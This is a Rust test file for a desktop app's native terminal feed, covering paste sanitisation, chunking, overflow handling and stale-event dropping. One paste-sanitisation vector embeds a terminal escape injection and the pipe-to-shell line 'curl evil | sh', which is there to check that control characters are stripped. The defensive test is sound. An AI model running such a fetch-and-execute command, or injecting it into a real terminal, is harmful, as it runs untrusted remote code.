use super::*;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;

const WAIT: Duration = Duration::from_secs(10);

fn team(index: i64) -> ViewKey {
    ViewKey {
        agent: AgentId::team(index).unwrap(),
        pane: None,
    }
}

/// An opener whose every session fails with one code, for rows that hold no engine.
fn failing(code: &'static str) -> Opener {
    Arc::new(move |_, _, _| Box::pin(async move { Err(failure(code)) }))
}

/// A feed over fresh terminals with the main window loaded, its inbox and a count of wakes.
/// Takes the opener and the inbox size. Returns the terminals, the feed, the inbox's receiver
/// and the wake count.
fn started(
    opener: Opener,
    inbox: usize,
) -> (
    Arc<Terminals>,
    EngineFeed,
    mpsc::Receiver<Fed>,
    Arc<AtomicUsize>,
) {
    let terminals = Arc::new(Terminals::default());
    terminals.page_started("main");
    let (sender, receiver) = mpsc::channel(inbox);
    let woken = Arc::new(AtomicUsize::new(0));
    let counted = Arc::clone(&woken);
    let wake: Wake = Arc::new(move || {
        counted.fetch_add(1, Ordering::SeqCst);
    });
    let feed = EngineFeed::new(Arc::clone(&terminals), opener, sender, wake);
    (terminals, feed, receiver, woken)
}

/// Makes view 7 an open native view of team-1 in the main window with a request queue of the
/// given size, as a landed attach leaves it. Takes the terminals, the feed and the size.
/// Returns the queue's receiver.
fn opened(
    terminals: &Arc<Terminals>,
    feed: &mut EngineFeed,
    size: usize,
) -> mpsc::Receiver<TerminalRequest> {
    let key = team(1);
    let place = terminals.room("main", &key).unwrap();
    let (requests, queue) = mpsc::channel(size);
    terminals
        .install_viewer("main", &key, place.serial(), requests)
        .unwrap();
    feed.slots.lock().unwrap().insert(
        7,
        Slot::Open {
            window: "main".to_owned(),
            key,
            serial: place.serial(),
        },
    );
    feed.opened += 1;
    feed.live.insert(7, feed.opened);
    queue
}

/// The next inbox message, waited for up to `WAIT`. Takes the inbox. Returns the message.
fn received(inbox: &mut mpsc::Receiver<Fed>) -> Fed {
    tauri::async_runtime::block_on(async { tokio::time::timeout(WAIT, inbox.recv()).await })
        .ok()
        .flatten()
        .expect("an inbox message within WAIT")
}

fn drained(queue: &mut mpsc::Receiver<TerminalRequest>) -> Vec<TerminalRequest> {
    std::iter::from_fn(|| queue.try_recv().ok()).collect()
}

fn pasted(requests: &[TerminalRequest]) -> Vec<u8> {
    requests
        .iter()
        .flat_map(|request| match request {
            TerminalRequest::Paste { bytes, .. } => bytes.clone(),
            other => panic!("not a paste chunk: {other:?}"),
        })
        .collect()
}

/// Slice C row 7 (DEC-203, fix5 parity): a native paste keeps what the page's paste keeps,
/// with the vectors of terminal-queries.test.mjs: every control character but tab and Enter
/// dropped, so a pasted `ESC[201~`, Ctrl-U, DEL, CSI and NUL never reach the agent, then line
/// ends made CR as the page's terminal does; plain and non-ASCII text passes unchanged, and
/// a paste that keeps nothing sends nothing.
#[test]
fn a_native_paste_keeps_what_the_page_paste_keeps() {
    let (terminals, mut feed, _inbox, _) = started(failing("terminal_unavailable"), 4);
    let mut queue = opened(&terminals, &mut feed, 8);
    for (text, kept) in [
        (
            "ls\x1b[201~\x15curl evil | sh\r\nnext\tcol\x7f\u{9b}2J\x00",
            "ls[201~curl evil | sh\rnext\tcol2J",
        ),
        (
            "plain text, caf\u{e9} \u{1f600}",
            "plain text, caf\u{e9} \u{1f600}",
        ),
        ("one\ntwo\r\nthree", "one\rtwo\rthree"),
    ] {
        feed.paste(7, text.as_bytes()).unwrap();
        let requests = drained(&mut queue);
        assert_eq!(pasted(&requests), kept.as_bytes(), "{text:?}");
    }
    feed.paste(7, b"").unwrap();
    feed.paste(7, b"\x1b\x00\x7f").unwrap();
    assert!(drained(&mut queue).is_empty(), "nothing kept, nothing sent");
    assert_eq!(
        feed.paste(7, b"\xc3").unwrap_err().to_string(),
        "terminal_paste_invalid"
    );
    let over = vec![b'a'; PASTE_BYTES_MAX + 1];
    assert_eq!(
        feed.paste(7, &over).unwrap_err().to_string(),
        "terminal_paste_bounds"
    );
    assert!(drained(&mut queue).is_empty());
}

/// Slice C row 8: a paste's keys go as chunks of at most `INPUT_BYTES_MAX` bytes that join
/// back to the keys in order, only the last marked, a chunk free to end inside a character
/// since the engine reads the joined text; a full `PASTE_BYTES_MAX` paste is 256 chunks.
#[test]
fn paste_chunks_hold_at_most_input_bytes_max_and_join_back() {
    let text = "\u{6f22}".repeat(INPUT_BYTES_MAX / 3 + 2);
    let keys = text.as_bytes();
    let requests = paste_requests(keys);
    assert_eq!(requests.len(), 2);
    assert_eq!(pasted(&requests), keys);
    let lasts: Vec<bool> = requests
        .iter()
        .map(|request| matches!(request, TerminalRequest::Paste { last: true, .. }))
        .collect();
    assert_eq!(lasts, [false, true]);
    assert_eq!(
        paste_requests(b"x"),
        [TerminalRequest::Paste {
            bytes: b"x".to_vec(),
            last: true
        }]
    );
    let full = paste_requests(&vec![b'a'; PASTE_BYTES_MAX]);
    assert_eq!(full.len(), PASTE_BYTES_MAX / INPUT_BYTES_MAX);
    assert!(full.iter().all(|request| matches!(
        request,
        TerminalRequest::Paste { bytes, .. } if bytes.len() == INPUT_BYTES_MAX
    )));
}

/// Slice C row 9: engine frames map onto feed events under the page's rules: output and the
/// attach of the view's own agent pass, an attach of another agent ends the view as a
/// mismatch, and a close or a refusal ends it with its code when plain, else the fallback.
#[test]
fn engine_frames_map_onto_feed_events_under_the_page_rules() {
    let agent = AgentId::team(1).unwrap();
    let other = AgentId::team(2).unwrap();
    let cases = [
        (
            TerminalFrame::Output {
                bytes: b"hi".to_vec(),
            },
            FeedEvent::Output {
                view: 3,
                bytes: b"hi".to_vec(),
            },
            false,
        ),
        (
            TerminalFrame::Attached {
                agent_id: agent.clone(),
                cols: 90,
                rows: 30,
            },
            FeedEvent::Attached {
                view: 3,
                cols: 90,
                rows: 30,
            },
            false,
        ),
        (
            TerminalFrame::Attached {
                agent_id: other,
                cols: 90,
                rows: 30,
            },
            FeedEvent::Ended {
                view: 3,
                code: "terminal_agent_mismatch".to_owned(),
            },
            true,
        ),
        (
            TerminalFrame::Closed {
                reason: "owner_grant_stale_or_revoked".to_owned(),
            },
            FeedEvent::Ended {
                view: 3,
                code: "owner_grant_stale_or_revoked".to_owned(),
            },
            true,
        ),
        (
            TerminalFrame::Closed {
                reason: "<b>bad</b>".to_owned(),
            },
            FeedEvent::Ended {
                view: 3,
                code: "terminal_closed".to_owned(),
            },
            true,
        ),
        (
            TerminalFrame::Rejected {
                code: "Not Plain".to_owned(),
            },
            FeedEvent::Ended {
                view: 3,
                code: "terminal_attach_failed".to_owned(),
            },
            true,
        ),
    ];
    for (frame, event, last) in cases {
        assert_eq!(feed_event(3, &agent, frame), (event, last));
    }
}

/// Slice C row 11: a paste larger than the room left in its view's queue is refused whole:
/// none of it is queued, the view ends and is detached, its host reads
/// `Ended(native_terminal_input_overflow)` and is woken, and the call answers that code.
#[test]
fn a_paste_larger_than_the_free_queue_is_refused_whole_and_ends_the_view() {
    let (terminals, mut feed, mut inbox, woken) = started(failing("terminal_unavailable"), 4);
    let mut queue = opened(&terminals, &mut feed, 2);
    feed.input(7, b"a", false).unwrap();
    let text = "b".repeat(INPUT_BYTES_MAX + 1);
    let refused = feed.paste(7, text.as_bytes()).unwrap_err();
    assert_eq!(refused.kind(), io::ErrorKind::WouldBlock);
    assert_eq!(refused.to_string(), NATIVE_OVERFLOW);
    assert_eq!(
        drained(&mut queue),
        [TerminalRequest::Input {
            bytes: b"a".to_vec()
        }],
        "no chunk of the refused paste was queued"
    );
    assert_eq!(
        feed.take(inbox.try_recv().unwrap()),
        Some(FeedEvent::Ended {
            view: 7,
            code: NATIVE_OVERFLOW.to_owned()
        }),
        "the overflow's Ended keeps its open's token until the host closes the view"
    );
    assert_eq!(woken.load(Ordering::SeqCst), 1);
    assert!(queue.is_closed(), "the ended view was detached");
    assert_eq!(
        feed.input(7, b"c", false).unwrap_err().to_string(),
        "terminal_not_attached"
    );
}

/// V243-PANE-SIZE-ACROSS-WINDOWS: each bound view's engine session opens as it was bound, at
/// its grid: a direct wall tile as a follower, a direct view input-only, any other full.
#[test]
fn a_bound_views_session_kind_reaches_its_opener() {
    let asked = Arc::new(Mutex::new(Vec::new()));
    let kept = Arc::clone(&asked);
    let opener: Opener = Arc::new(move |_, grid, kind| {
        kept.lock().unwrap().push((grid, kind));
        Box::pin(async move { Err(failure("terminal_unavailable")) })
    });
    let (terminals, mut feed, _inbox, _) = started(opener, 4);
    let kinds = [Session::Follow, Session::Input, Session::Full];
    for (index, kind) in (5..).zip(kinds) {
        let place = terminals.room("main", &team(index)).unwrap();
        feed.bind(index.unsigned_abs(), place, kind).unwrap();
        feed.open(index.unsigned_abs(), (47, 11)).unwrap();
    }
    let opened: Vec<((u16, u16), Session)> = kinds.iter().map(|kind| ((47, 11), *kind)).collect();
    assert_eq!(*asked.lock().unwrap(), opened);
}

/// Slice C: keys, wheel keys and resizes of an open view reach its queue in order as
/// `Input`, `Scroll` and `Resize`, each checked against the engine's bounds first; a view
/// that is not open takes nothing.
#[test]
fn an_open_views_keys_wheel_and_resize_reach_its_queue_in_order() {
    let (terminals, mut feed, _inbox, _) = started(failing("terminal_unavailable"), 4);
    let mut queue = opened(&terminals, &mut feed, 8);
    feed.input(7, b"ls\r", false).unwrap();
    feed.input(7, b"\x1b[<65;1;1M", true).unwrap();
    feed.resize(7, (120, 40)).unwrap();
    assert_eq!(
        drained(&mut queue),
        [
            TerminalRequest::Input {
                bytes: b"ls\r".to_vec()
            },
            TerminalRequest::Scroll {
                bytes: b"\x1b[<65;1;1M".to_vec()
            },
            TerminalRequest::Resize {
                cols: 120,
                rows: 40
            },
        ]
    );
    assert_eq!(
        feed.input(7, &[b'a'; INPUT_BYTES_MAX + 1], false)
            .unwrap_err()
            .to_string(),
        "terminal_input_bounds"
    );
    assert_eq!(
        feed.resize(7, (1, 40)).unwrap_err().to_string(),
        "terminal_request_invalid"
    );
    assert_eq!(
        feed.input(8, b"x", false).unwrap_err().to_string(),
        "terminal_not_attached"
    );
    assert!(drained(&mut queue).is_empty());
}

/// Slice C: a bound view whose engine session fails to open gives its place back and tells
/// its host `Ended` with the attach's code, woken; opening a view that is not bound, or at a
/// grid out of bounds, is refused, and closing a bound view gives its place back.
#[test]
fn a_failed_open_gives_the_place_back_and_ends_the_view_with_its_code() {
    let (terminals, mut feed, mut inbox, woken) = started(failing("terminal_agent_unknown"), 4);
    let key = team(1);
    let place = terminals.room("main", &key).unwrap();
    feed.bind(5, place, Session::Full).unwrap();
    let again = terminals.room("main", &team(2)).unwrap();
    assert_eq!(
        feed.bind(5, again, Session::Input)
            .err()
            .map(|error| error.code),
        Some("native_view_taken")
    );
    assert_eq!(
        feed.open(5, (1, 24)).unwrap_err().to_string(),
        "terminal_size_bounds"
    );
    assert_eq!(
        feed.open(6, (80, 24)).unwrap_err().to_string(),
        "native_view_unbound"
    );
    feed.open(5, (80, 24)).unwrap();
    let ended = received(&mut inbox);
    assert_eq!(
        feed.take(ended),
        Some(FeedEvent::Ended {
            view: 5,
            code: "terminal_agent_unknown".to_owned()
        })
    );
    let deadline = std::time::Instant::now() + WAIT;
    while woken.load(Ordering::SeqCst) == 0 {
        assert!(
            std::time::Instant::now() < deadline,
            "the host was never woken"
        );
        std::thread::sleep(Duration::from_millis(10));
    }
    assert_eq!(woken.load(Ordering::SeqCst), 1);
    assert!(feed.slots.lock().unwrap().is_empty());
    for index in 2..=crate::bridge::terminal::VIEWERS_MAX as i64 + 1 {
        std::mem::forget(terminals.room("main", &team(index)).unwrap());
    }

    let (terminals, mut feed, _inbox, _) = started(failing("terminal_agent_unknown"), 4);
    for index in 1..crate::bridge::terminal::VIEWERS_MAX as i64 {
        std::mem::forget(terminals.room("main", &team(index)).unwrap());
    }
    let last = team(crate::bridge::terminal::VIEWERS_MAX as i64);
    feed.bind(9, terminals.room("main", &last).unwrap(), Session::Input)
        .unwrap();
    assert!(
        terminals.room("main", &team(99)).is_err(),
        "the window is full"
    );
    feed.close(9);
    assert!(
        terminals.room("main", &team(99)).is_ok(),
        "closing the bound view gave its place back"
    );
}

/// #483 r1 sec F1: the host reads an event only through `take`, which hands it over while its
/// open is the view's live one: once view 5 of the main window is closed, then bound and
/// opened again in a wall window, an event of its first open, such as output its detached
/// reader sent late, is dropped, as is any event of a view closed and not opened again.
#[test]
fn an_event_of_a_closed_open_never_reaches_the_view_opened_again_in_another_window() {
    const WALL: &str = "terminals-0123456789abcdef-1";
    let (terminals, mut feed, mut inbox, _) = started(failing("terminal_agent_unknown"), 4);
    terminals.page_started(WALL);
    let ended = |view| FeedEvent::Ended {
        view,
        code: "terminal_agent_unknown".to_owned(),
    };
    feed.bind(5, terminals.room("main", &team(1)).unwrap(), Session::Full)
        .unwrap();
    feed.open(5, (80, 24)).unwrap();
    let first = received(&mut inbox);
    let late = Fed::new(
        first.token,
        FeedEvent::Output {
            view: 5,
            bytes: b"main window only".to_vec(),
        },
    );
    assert_eq!(feed.take(first), Some(ended(5)));
    assert!(feed.take(late.clone()).is_some(), "its open is live");
    feed.close(5);
    assert_eq!(
        feed.take(late.clone()),
        None,
        "a closed view's event is dropped"
    );
    feed.bind(5, terminals.room(WALL, &team(1)).unwrap(), Session::Full)
        .unwrap();
    feed.open(5, (80, 24)).unwrap();
    let second = received(&mut inbox);
    assert_ne!(second.token, late.token);
    assert_eq!(
        feed.take(late),
        None,
        "the first open's output never reaches the view opened in the wall window"
    );
    assert_eq!(feed.take(second), Some(ended(5)));
}

/// #488 r2 sec F1 residual: a view whose queue overflowed keeps its open's token so its
/// `Ended` reaches the host, but binding it again without `close`, here in a wall window,
/// drops every later event of that open: output its detached reader sends late never reaches
/// the place bound next, even before the view opens there (V243-NATIVE-FEED-FIXES).
#[test]
fn an_overflowed_view_bound_again_without_close_drops_its_first_opens_events() {
    const WALL: &str = "terminals-0123456789abcdef-1";
    let (terminals, mut feed, mut inbox, _) = started(failing("terminal_agent_unknown"), 4);
    terminals.page_started(WALL);
    let _queue = opened(&terminals, &mut feed, 1);
    let shown = FeedEvent::Output {
        view: 7,
        bytes: b"still open".to_vec(),
    };
    assert_eq!(
        feed.bind(7, terminals.room(WALL, &team(1)).unwrap(), Session::Full)
            .err()
            .map(|error| error.code),
        Some("native_view_taken")
    );
    assert_eq!(
        feed.take(Fed::new(feed.live[&7], shown.clone())),
        Some(shown),
        "a refused bind leaves the open view's events"
    );
    feed.input(7, b"a", false).unwrap();
    assert_eq!(
        feed.input(7, b"b", false).unwrap_err().to_string(),
        NATIVE_OVERFLOW
    );
    let overflow = inbox.try_recv().unwrap();
    let late = Fed::new(
        overflow.token,
        FeedEvent::Output {
            view: 7,
            bytes: b"the first project only".to_vec(),
        },
    );
    assert_eq!(
        feed.take(overflow),
        Some(FeedEvent::Ended {
            view: 7,
            code: NATIVE_OVERFLOW.to_owned()
        }),
        "the overflow's Ended reaches its host"
    );
    feed.bind(7, terminals.room(WALL, &team(1)).unwrap(), Session::Full)
        .unwrap();
    assert_eq!(
        feed.take(late),
        None,
        "the overflowed open's late output never reaches the view bound in the wall window"
    );
}

/// Moves the open task that calls it off its tokio worker, so the tasks it spawns next wait in
/// the queue every worker takes from, not in this worker's own slot that no other worker takes.
/// Takes nothing. Returns once a task spawned from here ran while this thread waited, which
/// shows the next spawns can run while the open task blocks; panics after 20 tries.
#[cfg(unix)]
fn leave_worker() {
    for _ in 0..20 {
        tokio::task::block_in_place(|| std::thread::sleep(Duration::from_millis(20)));
        let (ran, probe) = std::sync::mpsc::channel::<()>();
        tauri::async_runtime::spawn(async move {
            let _ = ran.send(());
        });
        if probe.recv_timeout(Duration::from_millis(200)).is_ok() {
            return;
        }
    }
    panic!("the open task never left its worker");
}

/// NOTE-0155 section 5 (rv-code2 #488 r2 N1, V243-NATIVE-FEED-FIXES): `Attached` reaches the
/// host only once its view is open, so its first key is never refused `terminal_not_attached`.
/// On a live engine terminal the test holds the slots lock from the session handover: no event
/// arrives while it is held, then `Attached` passes `take` and a key is taken. The row is
/// scheduler-dependent: its opener calls `leave_worker`, so a read task spawned early can run.
#[cfg(unix)]
#[test]
fn the_attached_of_a_live_open_reaches_the_host_only_once_its_view_is_open() {
    use crazyagent::engine::Client;
    use crazyagent::engine::bootstrap::EngineService;
    use crazyagent::engine::owner::OwnerClientKind;
    use crazyagent::harnesses::interactive::{InteractiveCommand, Transcript};
    use crazyagent::terminal::FOLDER;
    use crazyagent::terminal::tmux::installed;
    use kernel_processes::terminal::tmux::{SOCKET, Tmux};
    use kernel_processes::terminal::Host;
    use std::os::unix::fs::PermissionsExt;
    struct Server {
        tmux: std::path::PathBuf,
        socket: std::path::PathBuf,
    }
    impl Drop for Server {
        fn drop(&mut self) {
            let _ = kernel_processes::spawn_gate::status(
                std::process::Command::new(&self.tmux)
                    .arg("-S")
                    .arg(&self.socket)
                    .arg("kill-server")
                    .env_clear()
                    .stdin(std::process::Stdio::null())
                    .stdout(std::process::Stdio::null())
                    .stderr(std::process::Stdio::null()),
            );
        }
    }
    let tmp = tempfile::Builder::new()
        .prefix("ca-feed-open-")
        .tempdir_in(std::fs::canonicalize("/tmp").unwrap())
        .unwrap();
    let root = tmp.path();
    std::fs::set_permissions(root, std::fs::Permissions::from_mode(0o700)).unwrap();
    let global = root.join("g.toml");
    std::fs::write(&global, "version = 1\ntimeout_ms = 2000\n").unwrap();
    std::fs::set_permissions(&global, std::fs::Permissions::from_mode(0o600)).unwrap();
    let tmux = installed(root).expect("tmux is required for this test");
    let folder = root.join(FOLDER);
    let _server = Server {
        tmux: tmux.clone(),
        socket: folder.join(SOCKET),
    };
    let agent = AgentId::team(1).unwrap();
    let command = InteractiveCommand {
        argv: vec!["/bin/sh".into()],
        cwd: root.to_path_buf(),
        env: vec![("PS1".into(), "ready$ ".into())],
        transcript: Transcript::Unavailable,
    };
    let _launcher = {
        let launcher = Tmux::open(Some(tmux), &folder, crazyagent::sandbox::confinement(), crazyagent::terminal::tmux::tmux_hooks());
        launcher
            .spawn(
                &agent,
                &kernel_processes::terminal::PaneCommand::from(&command),
            )
            .unwrap();
        launcher
    };
    let (_stop, stopped) = tokio::sync::watch::channel(false);
    let (mut service, owner) = tauri::async_runtime::block_on(async {
        let service = EngineService::start_with_settings_sources(
            root,
            "e.sock",
            &global,
            &root.join("p.toml"),
            &stopped,
        )
        .await
        .unwrap();
        let (_, owner, _) = Client::new(root.join("e.sock"), WAIT)
            .unwrap()
            .with_owner(OwnerClientKind::Desktop)
            .await
            .unwrap();
        (service, Arc::new(owner))
    });
    let (release, gate) = tokio::sync::oneshot::channel::<()>();
    let gate = Arc::new(Mutex::new(Some(gate)));
    let (handed, sessions) = std::sync::mpsc::channel::<()>();
    let opener: Opener = Arc::new(move |key: ViewKey, _, _| -> Opening {
        let (owner, gate, handed) = (Arc::clone(&owner), Arc::clone(&gate), handed.clone());
        Box::pin(async move {
            let gate = gate.lock().unwrap().take().expect("one open");
            gate.await.expect("the test lets the open go");
            let session = owner
                .terminal_attach(key.agent)
                .await
                .map_err(|_| failure("terminal_outcome_unknown"))?;
            leave_worker();
            handed.send(()).expect("the test waits for the session");
            Ok(session)
        })
    });
    let (terminals, mut feed, mut inbox, _) = started(opener, 4);
    feed.bind(7, terminals.room("main", &team(1)).unwrap(), Session::Full)
        .unwrap();
    feed.open(7, (80, 24)).unwrap();
    let held = feed.slots.lock().unwrap();
    release.send(()).unwrap();
    sessions
        .recv_timeout(WAIT)
        .expect("the engine hands over the agent's terminal");
    let early = (0..25).find_map(|_| {
        std::thread::sleep(Duration::from_millis(20));
        inbox.try_recv().ok()
    });
    drop(held);
    assert!(
        early.is_none(),
        "no event of the view reaches the host while it is still opening"
    );
    let attached = received(&mut inbox);
    assert!(
        matches!(
            feed.take(attached),
            Some(FeedEvent::Attached { view: 7, .. })
        ),
        "the Attached passes take"
    );
    assert_eq!(
        feed.input(7, b"a", false)
            .map_err(|error| error.to_string()),
        Ok(()),
        "the first key sent on Attached is taken"
    );
    feed.close(7);
    let shutdown = tauri::async_runtime::block_on(async {
        tokio::time::timeout(Duration::from_secs(5), service.shutdown()).await
    });
    assert!(matches!(shutdown, Ok(Ok(()))));
}
